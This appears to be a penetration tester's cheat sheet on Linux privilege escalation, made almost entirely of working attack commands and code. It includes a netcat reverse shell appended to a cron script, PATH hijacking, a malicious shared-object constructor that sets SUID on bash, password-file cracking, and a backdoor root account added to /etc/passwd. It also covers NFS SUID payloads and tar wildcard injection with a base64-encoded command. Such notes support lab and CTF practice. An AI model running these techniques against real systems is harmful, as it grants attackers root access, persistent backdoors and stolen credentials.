# 🐧 Linux Privesc

## Enumeration

```shell
# user
id
whoami

# system
hostname

# net
ifconfig
ip a
ip route
route
routel
sudo tcpdump -i lo -A | grep "pass"

# connections
ss -ntplu
netstat -ntplu

# users
cat /etc/passwd

# OS info
cat /etc/issue
cat /etc/*release
uname -a

# processes
ps aux
# wide
ps auxww
# tree
ps axjf

# installed apps on system (debian-based)
dpkg -l

# find writable paths
find / -writable -type d 2>/dev/null

# list drives mounted at boot time 
cat /etc/fstab
mount
lsblk # show available disks

# list loaded kernel modules and get specific info to find an exploit
lsmod
/sbin/modinfo <module>
```

!!! tip
    🍪 Try to switch users using username as pass

## User trails

```shell
# env vars
env
# .bashrc config
cat .bashrc
watch -n 1 "ps -aux | grep pass"
```

## Interesting Files

```shell
# check history
history
cat ~/.*history | less

# config files
find /home/<user> -type f \( -name "*.txt" -o -name "*.conf" -o -name "*.ini" \) 2>/dev/null

# .ssh folder
find /home/<user> -type d -name ".ssh" 2>/dev/null

# kdbx files
find / -name "*.kdbx" 2>/dev/null
```

## Cron jobs

!!! tip
    🍪 Examine periodic processes with [pspy](https://github.com/DominicBreuker/pspy)

```shell
ls -lah /etc/cron*
# current user's jobs
crontab -l
# root user's jobs
sudo crontab -l

# inspect cron logs
grep "CRON" /var/log/syslog

# reverse shell to cron file
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> > /tmp/f" >> scripts/user_backups.sh 
```

## SUID/SGID/Sudo/Caps

!!! tip
    🍪 Check [GTFOBins](https://gtfobins.github.io/) for escaping the programs

```shell
# find programs and groups with bit
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# list capabilities
/usr/sbin/getcap -r / 2>/dev/null

# check sudo privs
sudo -l
```

### Path Hijacking

A SUID executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

Run **strings** on the file to look for strings of printable characters:

```shell
strings <suidexecutable>
```

One line (`apache2`) suggests that the service executable is being called to start the webserver, however the full path of the executable (`/usr/sbin/service`) is not being used.

Create a malicious file in a writable path and call it like the file the SUID executable calls.

```shell
echo '/bin/bash -p' > /tmp/apache2
```

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid executable to gain a root shell:

```shell
export PATH=/tmp:$PATH
```

```shell
apache2
```

### Shared Object Injection

A SUID executable can be vulnerable to shared object injection.

First, execute the file and notice the missing object error.

If there is no feedback, run **strace** on the file and search the output for open/access calls and for "no such file" errors:

```shell
strace suid-so 2>&1 | grep -iE "open|access|no such file"
```

Note that the executable tries to load the `.config/libcalc.so` shared object within the home directory, but it cannot be found.
Create the **.config** directory for the `libcalc.so` file: `mkdir .config`

After knowing the path, compile a malicious code into a shared object at the location the **suid-so** executable is looking for:

```c
#include <stdlib.h>

__attribute__((constructor)) void make_setuid() {
    system("chmod +s /bin/bash");
}
```

```shell
gcc -shared -fPIC libcalc.c -o libcalc.so 
```

Execute `/bin/bash -p` to gain a root shell.

```shell
/bin/bash -p
```

## Weak file permissions

!!! info
    🐈‍⬛ Hashcat mode -> 1800

```shell
# check if /etc/shadow can be readed and combine it with /etc/passwd to crack it
unshadow passwd shadow > passwords.txt
john --wordlist=<wordlist> passwords.txt

# check if /etc/shadow can be writable and put a new root hash
mkpasswd -m sha-512 newpassword

# check if /etc/passwd can be writable and put a new root hash
openssl passwd newpass
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Kernel exploits

```shell
cat /etc/issue
uname -r
arch

# find a public exploit
searchsploit <name>
```

## Automated Scripts

> [linPEAS.sh](https://github.com/peass-ng/PEASS-ng?tab=readme-ov-file)

> [Liinux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)

## NFS

```shell
# mountable shares
cat /etc/exports
showmount -e <ip>

# mount a share
mkdir /tmp/share
mount -o rw <ip>:<share> /tmp/share

# using Kali's root user, generate a payload and save it to the mounted share
# using Kali's root user, make the file executable and set the SUID permission:
chmod +xs share/shell.elf

# on the victim, as the low privileged user, execute the file to gain a root shell:
/<share_path>/shell.elf
```

## Tar Wildcard

A script that uses tar with a wildcard ( * ) is vulnerable to arbitrary command execution via maliciously crafted checkpoint files in the target directory.

```shell
echo -n 'chmod +s /bin/bash' | base64
> Y2htb2QgK3MgL2Jpbi9iYXNo

touch -- "--checkpoint=1"
touch -- '--checkpoint-action=exec="echo Y2htb2QgK3MgL2Jpbi9iYXNo | base64 -d | bash"'
```
